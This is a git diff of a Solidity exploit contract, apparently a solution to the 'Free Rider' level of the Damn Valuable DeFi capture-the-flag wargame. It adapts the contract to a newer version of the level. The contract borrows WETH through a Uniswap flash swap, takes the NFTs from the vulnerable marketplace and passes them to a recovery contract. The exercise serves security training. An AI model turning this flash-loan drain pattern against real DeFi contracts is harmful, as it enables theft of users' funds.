@@ -1,11 +1,14 @@
-//SDPDX-License-Identifier: MIT
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "../DamnValuableToken.sol";
-import "../DamnValuableNFT.sol";
-import "../free-rider/FreeRiderBuyer.sol";
+// import "../DamnValuableToken.sol";
+// import "../DamnValuableNFT.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+// import "../free-rider/FreeRiderBuyer.sol";
 import "../free-rider/FreeRiderNFTMarketplace.sol";
+import "../free-rider/FreeRiderRecovery.sol";
 import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
 import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
 import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
@@ -18,15 +21,17 @@ contract FreeRiderHack is IUniswapV2Callee, IERC721Receiver {
     FreeRiderNFTMarketplace immutable nftMarketplace;
     IWETH immutable weth;
     IERC721 immutable nft;
-    address freeRiderBuyer;
+    FreeRiderRecovery freeRiderBuyer;
     uint8 immutable amountOfNFT;
     uint256 immutable nftPrice;
+    address public player;
 
     constructor(
         IUniswapV2Pair _uniswapPair,
         FreeRiderNFTMarketplace _nftMarketplace,
         IWETH _weth,
-        address _freeRiderBuyer,
+        FreeRiderRecovery _freeRiderBuyer,
+        IERC721 _nft,
         uint8 _amountOfNFT,
         uint256 _nftPrice
     ) {
@@ -34,10 +39,11 @@ contract FreeRiderHack is IUniswapV2Callee, IERC721Receiver {
         uniswapPair = _uniswapPair;
         nftMarketplace = _nftMarketplace;
         weth = _weth;
-        nft = _nftMarketplace.token();
+        nft = _nft;
         freeRiderBuyer = _freeRiderBuyer;
         amountOfNFT = _amountOfNFT;
         nftPrice = _nftPrice;
+        player = msg.sender;
     }
 
     //TODO: 1 flashloan for 15 weth
@@ -74,7 +80,14 @@ contract FreeRiderHack is IUniswapV2Callee, IERC721Receiver {
         // send all of the nft to the FreeRiderBuyer contract
         for (uint256 tokenId = 0; tokenId < amountOfNFT; tokenId++) {
             tokenIds[tokenId] = tokenId;
-            nft.safeTransferFrom(address(this), freeRiderBuyer, tokenId);
+            bytes memory data = abi.encode(player);
+            nft.safeTransferFrom(
+                address(this),
+                address(freeRiderBuyer),
+                tokenId,
+                data
+            );
+            // nft.safeTransferFrom(address(this), freeRiderBuyer, tokenId);
         }
 
         // wrap enough WETH9 to repay our debt
